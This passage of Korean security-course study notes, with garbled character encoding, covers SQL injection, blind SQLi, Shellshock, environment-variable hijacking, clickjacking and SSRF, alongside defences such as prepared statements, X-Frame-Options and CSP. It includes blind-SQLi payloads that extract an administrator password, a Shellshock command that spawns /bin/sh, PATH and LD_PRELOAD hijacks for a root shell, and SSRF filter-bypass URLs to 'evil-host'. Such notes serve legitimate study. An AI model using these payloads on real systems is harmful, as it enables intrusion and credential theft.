<p>SQL ì¿¼ë¦¬ë¥¼ ë¯¸ë¦¬ ì¤€ë¹„í•˜ì—¬, ì‚¬ìš©ìì˜ ì…ë ¥ê°’ì„ ì‚½ì…í•˜ì§€ ì•Šê³ , ì¿¼ë¦¬ë¥¼ ì‹¤í–‰</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$stmt <span style=color:#f92672>=</span> $mysqli<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT NAME, SALARY, SSN FROM EMPLOYEE WHERE EID=? AND PASSWORD=?&#34;</span>);
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#75715e>// ss means &#34;string string&#34;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#75715e></span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>bind_param</span>(<span style=color:#e6db74>&#34;ss&#34;</span>, $EID, $PASSWORD);
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>();
</code></pre></div><h3 id=blind-sql-injection>Blind SQL Injection</h3>
<blockquote>
<p>SQL Injection ê³µê²©ì„ í†µí•´, DBì— ëŒ€í•œ ì •ë³´ë¥¼ íƒˆì·¨í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ol>
<li>Conditional Response</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Passwordì˜ ì²«ë²ˆì§¸ ë¬¸ìê°€ &#39;m&#39;ë³´ë‹¤ í°ì§€ í™•ì¸ */</span> 
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>xyz<span style=color:#e6db74>&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span>Administrator<span style=color:#e6db74>&#39;), 1, 1) &gt; &#39;</span>m
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#75715e>/* Passwordì˜ ì²«ë²ˆì§¸ ë¬¸ìê°€ &#39;t&#39;ë³´ë‹¤ í°ì§€ í™•ì¸ */</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>xyz<span style=color:#e6db74>&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span>Administrator<span style=color:#e6db74>&#39;), 1, 1) &gt; &#39;</span>t
</code></pre></div><ol start=2>
<li>SQL Error - Divide by Zero</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Passwordì˜ ì²«ë²ˆì§¸ ë¬¸ìê°€ &#39;m&#39;ë³´ë‹¤ í¬ë©´ ì˜¤ë¥˜ ë°œìƒ */</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>xyz<span style=color:#e6db74>&#39; AND (SELECT CASE WHEN (Username = &#39;</span>Administrator<span style=color:#e6db74>&#39; AND SUBSTRING(Password, 1, 1) &gt;
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#e6db74>&#39;</span>m<span style=color:#e6db74>&#39;) THEN 1/0 ELSE &#39;</span>a<span style=color:#e6db74>&#39; END FROM Users)=&#39;</span>a
</code></pre></div><ol start=3>
<li>SQL Error - Cast</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Passwordì˜ ì²«ë²ˆì§¸ ë¬¸ìê°€ &#39;m&#39;ë³´ë‹¤ í¬ë©´ ì˜¤ë¥˜ ë°œìƒ */</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#66d9ef>CAST</span>((<span style=color:#66d9ef>SELECT</span> example_column <span style=color:#66d9ef>FROM</span> example_table) <span style=color:#66d9ef>AS</span> int)
</code></pre></div><ol start=4>
<li>Time Delay</li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>/* Passwordì˜ ì²«ë²ˆì§¸ ë¬¸ìê°€ &#39;m&#39;ë³´ë‹¤ í¬ë©´ ë”œë ˆì´ ë°œìƒ */</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#e6db74>&#39;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#39;</span>Administrator<span style=color:#e6db74>&#39; AND
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#e6db74>SUBSTRING(Password, 1, 1) &gt; &#39;</span>m<span style=color:#e6db74>&#39;) = 1 WAITFOR DELAY &#39;</span><span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>0</span>:<span style=color:#960050;background-color:#1e0010>{</span>delay<span style=color:#960050;background-color:#1e0010>}</span><span style=color:#e6db74>&#39;-
</span></code></pre></div><h2 id=shellshock-attack>ShellShock Attack</h2>
<blockquote>
<p>bash ì‰˜ì˜ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬, ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<h3 id=set-uid-programs>Set-UID Programs</h3>
<blockquote>
<p>Set-UID root ê¶Œí•œì„ ê°€ì§„ í”„ë¡œê·¸ë¨ì´ systemí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ, ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ul>
<li>RUID : Real User ID : í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•œ ì‚¬ìš©ìì˜ ê¶Œí•œ</li>
<li>EUID : Effective User ID : í”„ë¡œê·¸ë¨ì´ ì‹¤í–‰ë˜ëŠ” ê¶Œí•œ</li>
<li>Set-UID Program : ì‚¬ìš©ìê°€ í”„ë¡œê·¸ë¨ì„ root ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” í”„ë¡œê·¸ë¨, RUIDì™€ EUIDê°€ ë‹¤ë¦„,</li>
<li>Set-UID Programì„ ë§Œë“œëŠ” ë°©ë²•
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$ sudo chown root vul
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>$ sudo chmod <span style=color:#ae81ff>4755</span> vul
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>$ ls -l vul
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>1234</span> Mar <span style=color:#ae81ff>11</span> 12:00 vul <span style=color:#75715e># sê°€ ì¡´ì¬</span>
</code></pre></div></li>
<li>ì·¨ì•½í•œ C í”„ë¡œê·¸ë¨ (vul : Set-UID program)
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>() {
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>  setuid(geteuid()); <span style=color:#75715e>// root ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìë¡œ ì„¤ì •
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span style=color:#75715e></span>  system(<span style=color:#e6db74>&#34;/bin/ls -l&#34;</span>); <span style=color:#75715e>// ls -l ëª…ë ¹ì–´ ì‹¤í–‰
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span style=color:#75715e></span>}
</code></pre></div></li>
<li>ê³µê²© ëª…ë ¹ì–´
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$ export foo<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;() { echo &#34;hello&#34;; }; /bin/sh&#39;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>$ ./vul
</code></pre></div></li>
</ul>
<h3 id=cgicommon-gateway-interface-programs>CGI(Common Gateway Interface) Programs</h3>
<blockquote>
<p>ì›¹ ì„œë²„ì—ì„œ ì‚¬ìš©í•˜ëŠ” CGI í”„ë¡œê·¸ë¨ì— ëŒ€í•œ ì·¨ì•½ì </p>
</blockquote>
<ul>
<li>ì·¨ì•½í•œ CGI í”„ë¡œê·¸ë¨ (test.cgi)
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#75715e>#!/bin/bash
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#75715e></span>echo <span style=color:#e6db74>&#34;Content-type: text/plain&#34;</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>echo
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>echo <span style=color:#e6db74>&#34;Hello, World!&#34;</span>
</code></pre></div></li>
<li>ê³µê²© ëª…ë ¹ì–´
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$ curl http://10.0.2.69/cgi-bin/test.cgi
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>Hello, World!
</code></pre></div></li>
<li>ê³µê²©ì„ í™œìš©í•˜ëŠ” ë°©ë²•
<ol>
<li>ì„¤ì • íŒŒì¼ì— í•˜ë“œì½”ë”©ëœ db password íƒˆì·¨</li>
<li>reverse shell ì‹¤í–‰</li>
</ol>
</li>
</ul>
<h2 id=environment-variables--attacks>Environment Variables & Attacks</h2>
<ul>
<li>í”„ë¡œì„¸ìŠ¤ê°€ í™˜ê²½ë³€ìˆ˜ë¥¼ ì–»ëŠ” ë°©ë²•
<ol>
<li>fork() : ìì‹ì„ ìƒì„±, ìì‹ì´ ë¶€ëª¨ì˜ í™˜ê²½ë³€ìˆ˜ë¥¼ ìƒì†</li>
<li>execve() : ìƒˆë¡œìš´ í”„ë¡œê·¸ë¨ì„ ìì‹ìœ¼ë¡œ ì‹¤í–‰, ìƒˆë¡œ í™˜ê²½ë³€ìˆ˜ë¥¼ ì„¤ì •</li>
</ol>
</li>
</ul>
<h3 id=attacks-via-dynamic-linker>Attacks via Dynamic Linker</h3>
<blockquote>
<p>ë§í¬ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì¡°ì‘í•˜ì—¬, ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ul>
<li>ì›ë¦¬
<ol>
<li>LD_PRELOADëŠ” ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ëª©ë¡ì„ ì €ì¥</li>
<li>í•¨ìˆ˜ë¥¼ ì°¾ì§€ ëª»í•˜ë©´, LD_LIBRARY_PATHì—ì„œ ì°¾ìŒ</li>
<li>ë‘ ë³€ìˆ˜ë¥¼ ì¡°ì‘í•˜ì—¬ ë§í¬ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì¡°ì‘</li>
</ol>
</li>
<li>ì˜ˆì‹œ
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$ export LD_PRELOAD<span style=color:#f92672>=</span>/path/to/malicious.so
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>$ ./vul
</code></pre></div></li>
</ul>
<h3 id=attacks-via-execution-program>Attacks via Execution Program</h3>
<blockquote>
<p>ì‹¤í–‰ í”„ë¡œê·¸ë¨ì„ ì¡°ì‘í•˜ì—¬, ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<ul>
<li>ì˜ˆì‹œ
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$ export PATH<span style=color:#f92672>=</span>/path/to/malicious:$PATH
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>$ ./vul
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#75715e># // root shell ì·¨ë“</span>
</code></pre></div></li>
</ul>
<h3 id=attacks-via-library>Attacks via Library</h3>
<blockquote>
<p>format string ë“±ì˜ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<h3 id=attacks-via-application-code>Attacks via Application Code</h3>
<blockquote>
<p>buffer overflow ë“±ì˜ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<h3 id=set-uid-approach-vs-service-approach>Set-UID Approach VS Service Approach</h3>
<h2 id=clickjacking-attack>Clickjacking Attack</h2>
<blockquote>
<p>ì‚¬ìš©ìì˜ ì˜ë„ì™€ ìƒê´€ì—†ì´ í´ë¦­ì„ ìœ ë„í•˜ì—¬, ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>&lt;<span style=color:#f92672>iframe</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;top&#34;</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.attack.com&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;opacity: 0&#34;</span>&gt;&lt;/<span style=color:#f92672>iframe</span>&gt;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>&lt;<span style=color:#f92672>iframe</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bottom&#34;</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.example.com&gt;&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;opacity: 1&#34;</span>&gt;&lt;/<span style=color:#f92672>iframe</span>&gt;
</code></pre></div><h3 id=ë°©ì–´-3>ë°©ì–´</h3>
<h4 id=client-side-framekiller-and-framebuster>Client-side (Framekiller and Framebuster)</h4>
<blockquote>
<p>javascriptë¥¼ ì´ìš©í•˜ì—¬, í•´ë‹¹ í˜ì´ì§€ê°€ iframeìœ¼ë¡œ ë Œë”ë§ë˜ëŠ” ê²ƒì„ ë°©ì§€</p>
</blockquote>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>top</span> <span style=color:#f92672>!=</span> <span style=color:#a6e22e>self</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>top</span>.<span style=color:#a6e22e>location</span> <span style=color:#f92672>!=</span> <span style=color:#a6e22e>self</span>.<span style=color:#a6e22e>location</span>)
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>...
</code></pre></div><ul>
<li>í•œê³„
<ul>
<li>ìš°íšŒí•  ìˆ˜ ìˆëŠ” ë°©ë²•ì´ ë§ì•„ì„œ ë¶ˆì•ˆì • -> ì˜ ì“°ì§€ ì•ŠëŠ”ë‹¤</li>
</ul>
</li>
<li>ìš°íšŒ
<ol>
<li>Double framing : ë‘ê°œì˜ iframeì„ ì‚¬ìš©í•˜ì—¬, ì²«ë²ˆì§¸ iframeì„ ìˆ¨ê¸°ê³ , ë‘ë²ˆì§¸ iframeì„ ë³´ì—¬ì¤Œ</li>
<li>Abusing onBeforeUnload : ì‚¬ìš©ìê°€ í˜ì´ì§€ë¥¼ ë– ë‚  ë•Œ, alertì„ ë„ì›Œì„œ, ì‚¬ìš©ìì˜ í´ë¦­ì„ ìœ ë„</li>
<li>sandbox attribute : iframeì— sandbox attributeë¥¼ ì‚¬ìš©í•˜ì—¬, í•´ë‹¹ iframeì—ì„œëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šë„ë¡ í•¨</li>
</ol>
<ul>
<li>options
<ol>
<li>allow-same-origin</li>
<li>allow-scripts</li>
<li>allow-forms</li>
<li>allow-modals</li>
<li>allow-top-navigation</li>
</ol>
</li>
<li>ì˜ˆì‹œ
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>&lt;<span style=color:#f92672>iframe</span> <span style=color:#960050;background-color:#1e0010>...</span> <span style=color:#a6e22e>sandbox</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;allow_forms allow-scripts&#34;</span>&gt;&lt;/<span style=color:#f92672>iframe</span>&gt;
</code></pre></div></li>
</ul>
</li>
<li>Referrer checking problems
<blockquote>
<p>Refererë¥¼ í™•ì¸í•˜ì—¬ íŠ¹ì • ë„ë©”ì¸ì˜ ì‚¬ì´íŠ¸ë§Œ iframeìœ¼ë¡œ ë Œë”ë§ë˜ì—ˆëŠ”ì§€ í™•ì¸</p>
</blockquote>
<ul>
<li>í•œê³„ : Refererë¥¼ ì¡°ì‘í•˜ì—¬ ìš°íšŒ ê°€ëŠ¥</li>
</ul>
</li>
</ul>
<h4 id=server-side>Server-side</h4>
<ul>
<li>
<p>X-Frame-Options</p>
<blockquote>
<p>íŠ¹ì • ORIGIN í˜ì´ì§€ì—ì„œë§Œ í•´ë‹¹ í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ë Œë”ë§í•  ìˆ˜ ìˆë„ë¡ í•¨</p>
</blockquote>
<ul>
<li>ì˜ˆì‹œ
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>X<span style=color:#f92672>-</span>Frame<span style=color:#f92672>-</span>Options: DENY <span style=color:#75715e>// í•´ë‹¹ í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ë Œë”ë§í•˜ì§€ ì•ŠìŒ
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#75715e></span>X<span style=color:#f92672>-</span>Frame<span style=color:#f92672>-</span>Options: SAMEORIGIN <span style=color:#75715e>// ê°™ì€ ORIGIN í˜ì´ì§€ì—ì„œë§Œ í•´ë‹¹ í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ë Œë”ë§
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#75715e></span>X<span style=color:#f92672>-</span>Frame<span style=color:#f92672>-</span>Options: ALLOW<span style=color:#f92672>-</span>FROM uri <span style=color:#75715e>// íŠ¹ì • uriì—ì„œë§Œ í•´ë‹¹ í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ë Œë”ë§
</span></code></pre></div></li>
<li>Outdated : CSP ì‚¬ìš© ê¶Œì¥</li>
</ul>
</li>
<li>
<p>Content Security Policy (CSP)</p>
<blockquote>
<p>ì›¹í˜ì´ì§€ì—ì„œ ì‹¤í–‰ ê°€ëŠ¥í•œ ë¦¬ì†ŒìŠ¤ë¥¼ ì œí•œ</p>
</blockquote>
<ul>
<li>script-src : ìŠ¤í¬ë¦½íŠ¸ sourceë¥¼ ì œí•œ</li>
<li>img-src : ì´ë¯¸ì§€ì˜ sourceë¥¼ ì œí•œ</li>
<li>frame-ancestors : <code>&lt;frame></code>, <code>&lt;iframe></code>, <code>&lt;object></code>, <code>&lt;embed></code> ë˜ëŠ” <code>&lt;applet></code> ìš”ì†Œì˜ ë¶€ëª¨ë¥¼ ì œí•œ</li>
<li>ì˜ˆì‹œ
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>$csp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Content-Security-Policy: frame-ancestors *&#34;</span>;
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span style=color:#a6e22e>header</span>($csp);
</code></pre></div></li>
</ul>
</li>
</ul>
<h3 id=types-of-context-integrity>Types of Context Integrity</h3>
<h4 id=visual-integrity>Visual Integrity</h4>
<blockquote>
<p>ë³´ì´ëŠ” ê²ƒê³¼ ì‹¤ì œë¡œ ì‹¤í–‰ë˜ëŠ” ê²ƒì˜ ì°¨ì´ì— ëŒ€í•œ ë¬´ê²°ì„±</p>
</blockquote>
<ul>
<li>ë°©ì–´ë¥¼ ìœ„í•œ ë°©ë²• : User Confirmation, UI Randomization, Visibility Detection on Click</li>
</ul>
<h4 id=temporary-integrity>Temporary Integrity</h4>
<blockquote>
<p>ì‚¬ìš©ì í™•ì¸ ì‹œì ê³¼ í´ë¦­ ì‹œì‘ ì‹œì  ì‚¬ì´ì˜ UI ìƒíƒœ ì°¨ì´ì— ëŒ€í•œ ë¬´ê²°ì„±</p>
</blockquote>
<ul>
<li>ë°©ì–´ë¥¼ ìœ„í•œ ë°©ë²• : Acess Control Gadgets</li>
</ul>
<h2 id=ssrf-server-side-request-forgery>SSRF (Server Side Request Forgery)</h2>
<blockquote>
<p>ì„œë²„ì—ì„œ ë‹¤ë¥¸ ì„œë²„ë¡œ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê³µê²© ê¸°ë²•</p>
</blockquote>
<h3 id=ê³µê²©-ì„œë²„ê°€-ì‹ ë¢°ëœ-ì„œë²„ì—ì„œ-ìš”ì²­ì´-ì˜¨-ê²ƒìœ¼ë¡œ-ì°©ê°>ê³µê²© (ì„œë²„ê°€ ì‹ ë¢°ëœ ì„œë²„ì—ì„œ ìš”ì²­ì´ ì˜¨ ê²ƒìœ¼ë¡œ ì°©ê°)</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>POST /product/stock HTTP/1.0
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>Content-Type: application/www-form-urlencoded
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span>Content-Length: 30
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span>stockApi=http://localhost/admin
</code></pre></div><h3 id=ë°©ì–´-4>ë°©ì–´</h3>
<ul>
<li>ì°¨ë‹¨ëœ ë¬¸ìì—´ì„ URL ì¸ì½”ë”© ë˜ëŠ” ëŒ€ì†Œë¬¸ì ë³€í˜•ì„ í†µí•´ ìˆ¨ê¹€</li>
<li>ì„œë¡œ ë‹¤ë¥¸ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ì—¬, ìš”ì²­ì„ ë³´ëƒ„</li>
<li>using @</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>https://expected-host:fakepassword@evil-host
</code></pre></div><ul>
<li>using #</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>https://evil-host#expected-host
</code></pre></div><ul>
<li>Rogue DNS</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span>https://expected-host.evil-host
</code></pre></div><ul>
<li>Double encoding : <code># -> %23 -> %2523</code></li>
</ul>
<h3 id=xxe-xml-external-entity-injection>XXE (XML eXternal Entity) Injection</h3>
<blockquote>
<p>XML íŒŒì‹± ê³¼ì •ì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬, ê³µê²©í•˜ëŠ” ê¸°ë²•</p>
</blockquote>
</article>
<div id=meta class=my-16>
<div>
<div class="flex justify-between w-full text-lg">
<a class="previous mr-5 overflow-ellipsis-bundle hover-bold" href=/til/school/human_computer_interface/>
<span class=mx-3>â—€</span>
ì¸ê°„-ì»´í“¨í„° ìƒí˜¸ì‘ìš©
</a>
<a class="next ml-5 overflow-ellipsis-bundle hover-bold" href=/til/school/plt/>
í”„ë¡œê·¸ë˜ë°ì–¸ì–´ê°œë¡ 
<span class=mx-3>â–¶</span>
</a>
</div>
</div>
</div>
<div id=comment-box></div>
</section>
</main>
</div>
</body>
</html>